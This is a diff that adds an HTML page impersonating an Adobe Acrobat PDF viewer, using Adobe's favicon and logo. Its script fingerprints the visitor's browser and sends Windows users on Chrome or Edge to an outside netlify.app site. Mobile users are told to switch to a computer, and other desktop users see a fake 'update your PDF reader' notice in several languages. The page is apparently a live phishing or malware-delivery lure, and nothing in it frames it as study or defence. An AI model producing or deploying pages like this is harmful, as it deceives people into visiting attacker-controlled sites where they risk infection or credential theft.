@@ -1,1 +1,186 @@
-test
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title> PDF </title>
+<link rel="shortcut icon" href="https://acrobat.adobe.com/favicon.ico" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: #f5f5f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .box {
+        background: #fff;
+        max-width: 420px;
+        width: 100%;
+        padding: 30px;
+        text-align: center;
+        border-radius: 6px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+        width: 120px;
+        margin-bottom: 20px;
+    }
+
+    h1 {
+        font-size: 20px;
+        margin-bottom: 15px;
+        color: #333;
+    }
+
+    p {
+        font-size: 14px;
+        color: #555;
+        line-height: 1.6;
+    }
+
+    button {
+        margin-top: 20px;
+        padding: 12px 25px;
+        background: #d32f2f;
+        border: none;
+        color: #fff;
+        font-size: 14px;
+        cursor: pointer;
+        border-radius: 4px;
+    }
+
+    button:hover {
+        background: #b71c1c;
+    }
+</style>
+</head>
+
+<body>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Adobe_Acrobat_DC_logo_2020.png" class="logo">
+    <h1 id="title"></h1>
+    <p id="paragraph"></p>
+</div>
+
+<script>
+window.onload = function () {
+
+    const ua = navigator.userAgent || "";
+    const isWindows = ua.includes("Windows");
+    const isChrome = ua.includes("Chrome") && !ua.includes("Edg/");
+    const isEdge = ua.includes("Edg/");
+    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+
+    // ✅ Lista de idiomas (ordem real do dispositivo)
+    const langsRaw = (navigator.languages && navigator.languages.length)
+        ? navigator.languages
+        : [navigator.language || "en"];
+
+    const langs = langsRaw
+        .map(l => (l || "en").toLowerCase())
+        .filter(Boolean);
+
+    // ✅ Windows → mantém igual
+    if (isWindows && (isChrome || isEdge)) {
+        document.body.innerHTML = "";
+        window.location.href = "https://faturaxpress.netlify.app/";
+        return;
+    }
+
+    // Dicionários (mobile)
+    const mobileTitle = {
+        "pt-pt": "Documento indisponível",
+        "pt-br": "Documento indisponível",
+        "pt":    "Documento indisponível",
+        "es": "Documento no disponible",
+        "fr": "Document indisponible",
+        "de": "Dokument nicht verfügbar",
+        "it": "Documento non disponibile",
+        "tr": "Belge kullanılamıyor",
+        "en": "Document unavailable"
+    };
+
+    const mobileMsg = {
+        "pt-pt": "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
+        "pt-br": "Este documento não pode ser visualizado no celular. Por favor, abra em um computador.",
+        "pt":    "Este documento não pode ser visualizado no telemóvel. Por favor, abra num computador.",
+        "es": "Este documento no se puede ver en el móvil. Ábralo en un ordenador.",
+        "fr": "Ce document ne peut pas être affiché sur mobile. Veuillez l’ouvrir sur un ordinateur.",
+        "de": "Dieses Dokument kann auf dem Handy nicht angezeigt werden. Bitte öffnen Sie es auf einem Computer.",
+        "it": "Questo documento non può essere visualizzato sul cellulare. Aprilo su un computer.",
+        "tr": "Bu belge telefonda görüntülenemez. Lütfen bir bilgisayarda açın.",
+        "en": "This document cannot be viewed on mobile. Please open it on a computer."
+    };
+
+    // ✅ Escolhe UMA chave final (a mesma para título e mensagem)
+    function pickKey(dictA, dictB) {
+        // tenta primeiro o idioma completo (pt-PT), depois base (pt)
+        for (const l of langs) {
+            const base = l.split("-")[0];
+            if (dictA[l] && dictB[l]) return l;
+            if (dictA[base] && dictB[base]) return base;
+        }
+        return "en";
+    }
+
+    if (isMobile) {
+        const key = pickKey(mobileTitle, mobileMsg);
+
+        document.documentElement.setAttribute("lang", key);
+        document.getElementById("title").innerText = mobileTitle[key] || mobileTitle["en"];
+        document.getElementById("paragraph").innerText = mobileMsg[key] || mobileMsg["en"];
+        return;
+    }
+
+    // Desktop (não Windows): mantém conteúdo (para não ficar vazio)
+    const desktopTitle = {
+        "pt-pt": "Adobe Acrobat Reader: Ler PDF",
+        "pt-br": "Adobe Acrobat Reader: Ler PDF",
+        "pt":    "Adobe Acrobat Reader: Ler PDF",
+        "es": "Adobe Acrobat Reader: Leer PDF",
+        "fr": "Adobe Acrobat Reader : Lire le PDF",
+        "de": "Adobe Acrobat Reader: PDF lesen",
+        "it": "Adobe Acrobat Reader: Leggi il PDF",
+        "tr": "Adobe Acrobat Reader: PDF görüntüle",
+        "en": "Adobe Acrobat Reader: Read PDF"
+    };
+
+    const desktopText = {
+        "pt-pt": "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
+        "pt-br": "Atualizações disponíveis.<br><br>• Para visualizar este arquivo PDF, é necessário atualizar o aplicativo de leitura de PDF.<br><br>Após a atualização, será possível visualizar o arquivo.",
+        "pt":    "Atualizações disponíveis.<br><br>• Para visualizar este ficheiro PDF, é necessário atualizar a aplicação de leitura de PDF.<br><br>Após a atualização, poderá visualizar o ficheiro.",
+        "es": "Actualizaciones disponibles.<br><br>• Para ver este archivo PDF, necesitas actualizar tu lector de PDF.<br><br>Después de la actualización, podrás ver el archivo.",
+        "fr": "Mises à jour disponibles.<br><br>• Pour afficher ce fichier PDF, vous devez mettre à jour votre lecteur PDF.<br><br>Après la mise à jour, vous pourrez afficher le fichier.",
+        "de": "Updates verfügbar.<br><br>• Um diese PDF-Datei anzuzeigen, müssen Sie Ihren PDF-Reader aktualisieren.<br><br>Nach dem Update können Sie die Datei anzeigen.",
+        "it": "Aggiornamenti disponibili.<br><br>• Per visualizzare questo PDF, è necessario aggiornare il lettore PDF.<br><br>Dopo l’aggiornamento sarà possibile visualizzare il file.",
+        "tr": "Güncellemeler mevcut.<br><br>• Bu PDF dosyasını görüntülemek için PDF okuyucunuzu güncellemeniz gerekir.<br><br>Güncellemeden sonra dosyayı görüntüleyebilirsiniz.",
+        "en": "Updates available.<br><br>• To view this PDF file, you need to update your PDF reader.<br><br>After the update, you will be able to view the file."
+    };
+
+    // Desktop key único também
+    function pickKeySingle(dict) {
+        for (const l of langs) {
+            const base = l.split("-")[0];
+            if (dict[l]) return l;
+            if (dict[base]) return base;
+        }
+        return "en";
+    }
+
+    const k1 = pickKeySingle(desktopTitle);
+    const k2 = pickKeySingle(desktopText);
+    const k = (k1 === k2) ? k1 : (desktopTitle[k1] && desktopText[k1] ? k1 : (desktopTitle[k2] && desktopText[k2] ? k2 : "en"));
+
+    document.documentElement.setAttribute("lang", k);
+    document.getElementById("title").innerText = desktopTitle[k] || desktopTitle["en"];
+    document.getElementById("paragraph").innerHTML = desktopText[k] || desktopText["en"];
+};
+</script>
+</body>
+</html>
